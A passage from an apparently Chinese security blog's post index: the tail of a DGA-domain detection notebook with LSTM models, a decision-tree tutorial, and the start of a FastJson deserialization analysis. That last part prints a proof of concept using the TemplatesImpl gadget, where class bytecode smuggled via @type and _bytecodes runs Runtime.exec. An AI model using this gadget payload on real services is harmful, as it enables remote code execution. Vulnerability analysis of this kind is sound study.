1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1], &#39;labels&#39;: 2403    legit\n2789    legit\n450     legit\n4521    legit\n2841    legit\n8645      dga\n6999      dga\n7831      dga\n6291      dga\n3746    legit\n6226      dga\n4111    legit\n8487      dga\n678     legit\n90      legit\n6151      dga\n8300      dga\n4004    legit\n2489    legit\n4836    legit\n8291      dga\n8198      dga\n8911      dga\n7585      dga\n260     legit\n5905      dga\n5646      dga\n970     legit\n8718      dga\n275     legit\n        ...  \n8589      dga\n6620      dga\n7470      dga\n5230      dga\n4827    legit\n5677      dga\n3417    legit\n8539      dga\n7147      dga\n3699    legit\n4751    legit\n3043    legit\n5475      dga\n3736    legit\n3887    legit\n6349      dga\n4996    legit\n7379      dga\n3530    legit\n1942    legit\n7914      dga\n9752      dga\n6717      dga\n5363      dga\n7622      dga\n961     legit\n1641    legit\n4607    legit\n8649      dga\n6087      dga\nName: class, Length: 2000, dtype: object, &#39;probs&#39;: array([[0.14488636],\n       [0.00496732],\n       [0.00896166],\n       ...,\n       [0.00593334],\n       [0.95598286],\n       [0.9867235 ]], dtype=float32), &#39;epochs&#39;: 43, &#39;confusion_matrix&#39;: array([[972,  29],\n       [ 62, 937]])&#125;\n\nz_test = np.array([[0, 0, 0, 0, 0,  0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1]])model.predict(z_test)\n\n\n\n\narray([[1.]], dtype=float32)\n\nprint(sklearn.metrics.classification_report(final_data[0][&#x27;y&#x27;], final_data[0][&#x27;probs&#x27;] &gt; .5))\n\n              precision    recall  f1-score   support\n\n           0       0.95      0.97      0.96       970\n           1       0.97      0.95      0.96      1030\n\n   micro avg       0.96      0.96      0.96      2000\n   macro avg       0.96      0.96      0.96      2000\nweighted avg       0.96      0.96      0.96      2000\n\nLSTMdef build_model_lstm(max_features, maxlen):    &quot;&quot;&quot;Build LSTM model&quot;&quot;&quot;    model = Sequential()    model.add(Embedding(max_features, 128, input_length=maxlen))    #添加一个嵌入层，嵌入层是将正整数（下标）转换为具有固定大小的向量    model.add(LSTM(128))    #添加长短期记忆网络LSTM，从样本中学习特征，这个是核心层    model.add(Dropout(0.5))    #添加Dropout层防止过拟合    model.add(Dense(1))    model.add(Activation(&#x27;sigmoid&#x27;))    model.compile(loss=&#x27;binary_crossentropy&#x27;, optimizer=&#x27;rmsprop&#x27;)    #编译模型，损失函数采用对数损失函数，优化器选用rmsprop    return model\n\n\nX = all_domains[&#x27;domain&#x27;]labels = all_domains[&#x27;class&#x27;]valid_chars = &#123;x:idx+1 for idx, x in enumerate(set(&#x27;&#x27;.join(X)))&#125;max_features = len(valid_chars) + 1#计算特征字符长度maxlen = np.max([len(x) for x in X])#记录最长的域名长度X = [[valid_chars[y] for y in x] for x in X]#转换为下标数组X = sequence.pad_sequences(X, maxlen=maxlen)#进行长度填充y = [0 if x == &#x27;legit&#x27; else 1 for x in labels]final_data = []\n\n\nfor fold in range(nfolds):    print(&quot;fold %u/%u&quot; % (fold+1, nfolds))    X_train, X_test, y_train, y_test, _, label_test = train_test_split(X, y, labels,                                                                            test_size=0.2)    print(&#x27;Build model...&#x27;)    model = build_model_lstm(max_features, maxlen)    print(&quot;Train...&quot;)    X_train, X_holdout, y_train, y_holdout = train_test_split(X_train, y_train, test_size=0.05)    best_iter = -1    best_auc = 0.0    out_data = &#123;&#125;    for ep in range(max_epoch):        model.fit(X_train, y_train, batch_size=batch_size, nb_epoch=1)        t_probs = model.predict_proba(X_holdout)        t_auc = sklearn.metrics.roc_auc_score(y_holdout, t_probs)        print(&#x27;Epoch %d: auc = %f (best=%f)&#x27; % (ep, t_auc, best_auc))        if t_auc &gt; best_auc:            best_auc = t_auc            best_iter = ep            probs = model.predict_proba(X_test)            out_data = &#123;&#x27;y&#x27;:y_test, &#x27;labels&#x27;: label_test, &#x27;probs&#x27;:probs, &#x27;epochs&#x27;: ep, &#x27;confusion_matrix&#x27;: sklearn.metrics.confusion_matrix(y_test, probs &gt; .5)&#125;            print(sklearn.metrics.confusion_matrix(y_test, probs &gt; .5))        else:            if (ep-best_iter) &gt; 2:                break    final_data.append(out_data)\n\nfold 1/10\nBuild model...\nTrain...\n\nEpoch 1/1\n7600/7600 [==============================] - 24s 3ms/step - loss: 0.3562\nEpoch 0: auc = 0.979725 (best=0.000000)\n[[893 113]\n [ 42 952]]\nEpoch 1/1\n7600/7600 [==============================] - 23s 3ms/step - loss: 0.1643\nEpoch 7: auc = 0.980221 (best=0.981659)\nEpoch 1/1\n7600/7600 [==============================] - 21s 3ms/step - loss: 0.1603\nEpoch 8: auc = 0.979843 (best=0.981659)\n\nprint(sklearn.metrics.classification_report(final_data[0][&#x27;y&#x27;], final_data[0][&#x27;probs&#x27;] &gt; .5))\n\n              precision    recall  f1-score   support\n\n           0       0.95      0.96      0.96      1006\n           1       0.96      0.95      0.95       994\n\n   micro avg       0.96      0.96      0.96      2000\n   macro avg       0.96      0.96      0.96      2000\nweighted avg       0.96      0.96      0.96      2000\n\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"Decision Tree","url":"/Decision%20Tree/","content":"0x01 DT分类算法\n优点\n\n计算复杂度不高\n输出结果易于理解\n中间值缺失不敏感\n可处理不相关特征\n\n缺点\n\n可能会产生过度匹配问题\n\n适用数据类型：\n\n数值型\n标称型\n\n0x02 准备数据算法描述\n1.根节点开始，测试待分类项中相应的特征属性\n\n2.按照其值选择输出分支，直到到达叶子节点\n\n3.将叶子节点存放的类别作为决策结果\n\n\n划分数据集\n\n将无序的数据变得更加有序\n信息增益：划分数据集之后信息发生的变化熵：信息的期望值\n\n熵计算公式\n\n\ndef calcShannonEnt(dataSet):    numEntries = len(dataSet) #计算数据集中实例总数    labelCounts = &#123;&#125;    #统计每个键值的数量，dict    for featVec in dataSet:        currentLabel = featVec[-1]        if currentLabel not in labelCounts.keys():            labelCounts[currentLabel] = 0        labelCounts[currentLabel] += 1    shannonEnt = 0.0    #计算香农熵    for key in labelCounts:        prob = float(labelCounts[key])/numEntries        shannonEnt -= prob * log(prob, 2)    return shannonEnt\n\n\n\n划分数据集\n\n按照给定特征划分数据集\ndef splitDataSet(dataSet, axis, value):    &#x27;&#x27;&#x27;        :param dataSet: 待划分数据集    :param axis: 特征    :param value: 特征值    :return: 符合条件的值列表    &#x27;&#x27;&#x27;    retDataSet = []    for featVec in dataSet:        if featVec[axis] == value:            reducedFeatVec = featVec[:axis]                 reducedFeatVec.extend(featVec[axis+1:]) #把特征列除去            retDataSet.append(reducedFeatVec)    return retDataSet\n\n选择最好的数据集划分方式\n熵越高，则混合的数据就越多\ndef chooseBestFeatureToSplit(dataSet):    &#x27;&#x27;&#x27;    :param dataSet: 数据集    :return:    &#x27;&#x27;&#x27;    numFeatures = len(dataSet[0]) - 1      #特征列的长度，-1为label    baseEntropy = calcShannonEnt(dataSet)  #计算数据集的香农熵    bestInfoGain = 0.0    bestFeature = -1    for i in range(numFeatures):        featList = [example[i] for example in dataSet] #创建一个list包含所有数据的第i个feature        uniqueVals = set(featList)       #转变为set格式        newEntropy = 0.0        for value in uniqueVals:            subDataSet = splitDataSet(dataSet, i, value) #遍历featList中的所有feature，对每个feture划分一次数据集            prob = len(subDataSet)/float(len(dataSet))            newEntropy += prob * calcShannonEnt(subDataSet)  #计算当前feature的香农熵        infoGain = baseEntropy - newEntropy     #计算熵差，信息增益        if (infoGain &gt; bestInfoGain): #计算最大信息增益            bestInfoGain = infoGain            bestFeature = i    return bestFeature                      #返回最好的feature\n\n递归构建决策树\n1.得到数据集2.最好feature划分3.递归划分\n当处理了所有feature后，类标签仍然不唯一时，采用多数表决方式决定子节点分类\ndef majorityCnt(classList):    classCount=&#123;&#125;    for vote in classList:        if vote not in classCount.keys():            classCount[vote] = 0        classCount[vote] += 1    sortedClassCount = sorted(classCount.items(), key=operator.itemgetter(1), reverse=True)    return sortedClassCount[0][0]\n\n利用递归构建tree\ndef createTree(dataSet,labels):    classList = [example[-1] for example in dataSet] #数据集的所有类标签    if classList.count(classList[0]) == len(classList):         return classList[0] #当类标签完全相同返回该类标签    if len(dataSet[0]) == 1: #当所有属性都处理完，label仍然不唯一时，采用表决方式        return majorityCnt(classList)    bestFeat = chooseBestFeatureToSplit(dataSet)    bestFeatLabel = labels[bestFeat] #当前数据集选取的最好特征变量    myTree = &#123;bestFeatLabel: &#123;&#125;&#125;    del(labels[bestFeat]) #删除用过的feature    featValues = [example[bestFeat] for example in dataSet]    uniqueVals = set(featValues)    for value in uniqueVals:         subLabels = labels[:]        myTree[bestFeatLabel][value] = createTree(splitDataSet(dataSet, bestFeat, value), subLabels) #利用递归构建tree    return myTree  \n\n\n绘制树形图\n\n利用Matplotlib annotations实现绘制树形图\n实现效果如下图\n\n0x03 测试和储存分类器\n将标签字符串转换为索引\n\ndef classify(inputTree,featLabels,testVec):    &#x27;&#x27;&#x27;    :param inputTree: tree dict    :param featLabels: labels    :param testVec: 位置,eg.[1, 0]    :return:    &#x27;&#x27;&#x27;    firstStr = list(inputTree.keys())[0]    secondDict = inputTree[firstStr]    featIndex = featLabels.index(firstStr)    key = testVec[featIndex]    valueOfFeat = secondDict[key]    if isinstance(valueOfFeat, dict):         classLabel = classify(valueOfFeat, featLabels, testVec)    else:        classLabel = valueOfFeat    return classLabel\n\n\n\n存储决策树\n\n使用pickle持久化对象\npickle.dump(obj, file[, protocol])\ndef storeTree(inputTree, filename):    import pickle    fw = open(filename, &#x27;wb&#x27;)    pickle.dump(inputTree, fw)    fw.close()    def grabTree(filename):    import pickle    fr = open(filename, &#x27;rb&#x27;)    return pickle.load(fr)\n\n0x04 使用决策树预测隐形眼镜类型\n收集数据\n\nlenses\n\n准备数据\n\n解析通过’\\t’分隔的数据\n\n\n\n分析数据&amp;训练模型\n\nlabels = [&#x27;age&#x27;, &#x27;prescript&#x27;, &#x27;astigmatic&#x27;, &#x27;tearRate&#x27;]lenses_tree = createTree(lenses, labels)\n\n\n\n测试模型\n\n\n\n0x05 其它模型\nID3（分类树）\n  每次根据“最大信息熵增益”选取当前最佳的特征来分割数据，并按照该特征的所有取值来切分\n\nC4.5（分类树）\n  ID3的升级版，采用信息增益比率，通过引入一个被称作分裂信息(Split information)的项来惩罚取值较多的Feature  弥补了ID3中不能处理特征属性值连续的问题\n\nCART（分类回归树）\n  CART是一棵二叉树，采用二元切分法，每次把数据切成两份，分别进入左子树、右子树。而且每个非叶子节点都有两个孩子，所以CART的叶子节点比非叶子多1\n\n\n0x05 安全领域\n分析恶意网络攻击和入侵\n口令爆破检测\n僵尸流量检测\n\n","categories":["安全数据分析"],"tags":["ML"]},{"title":"FastJson Unserialization","url":"/FastJson%20Unserialization/","content":"漏洞公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315\n\n0x00 关于漏洞漏洞公告：https://github.com/alibaba/fastjson/wiki/security_update_20170315\n0x01 POC分析参考的网上的POC\nPOC\npublic class FastJsonPoc extends AbstractTranslet &#123;    public FastJsonPocCls() throws IOException &#123;        Runtime.getRuntime().exec(&quot;open /Applications/Calculator.app&quot;);    &#125;    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123;    &#125;    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123;    &#125;    public static void main(String[] args) throws Exception &#123;        FastJsonPocC t = new FastJsonPocC();    &#125;&#125;\n\nDEMO\npublic class FastjsonVulTest &#123;    public static String readClass(String cls)&#123;        ByteArrayOutputStream bos = new ByteArrayOutputStream();        try &#123;            IOUtils.copy(new FileInputStream(new File(cls)), bos);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;        byte[] aa = bos.toByteArray();        return Base64.encodeBase64String(bos.toByteArray());    &#125;    public static void test_autoTypeDeny()&#123;        String clsPath = &quot;/Users/****/src/main/java/com/alibaba/middleware/FastJsonPocC.class&quot;;        String evilCode = readClass(clsPath);        final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;        String testJson = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS +                &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode+&quot;\\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;;        Object obj = JSON.parseObject(testJson, Object.class, Feature.SupportNonPublicField);    &#125;    public static void main(String args[])&#123;        try &#123;            test_autoTypeDeny();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nString testJson = &quot;&#123;\\&quot;@type\\&quot;:\\&quot;&quot; + NASTY_CLASS +                 &quot;\\&quot;,\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;+evilCode+&quot;\\&quot;],&#39;_name&#39;:&#39;a.b&#39;,&#39;_tfactory&#39;:&#123; &#125;,\\&quot;_outputProperties\\&quot;:&#123;&#125;&#125;\\n&quot;;\n将JSONString转换成@type指定的TemplatesImpl类,即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\n_bytecodes是恶意利用代码的字节码（FastJsonPoc）\n设置了4个属性和对应的值：_bytecodes、_name、_tfactory和_outputProperties\n通过查看TemplatesImpl的代码发现，_tfactory和_outputProperties属性没有对应getter／setter方法\n_bytecodes\n\n_name\n\nfastjson会在new 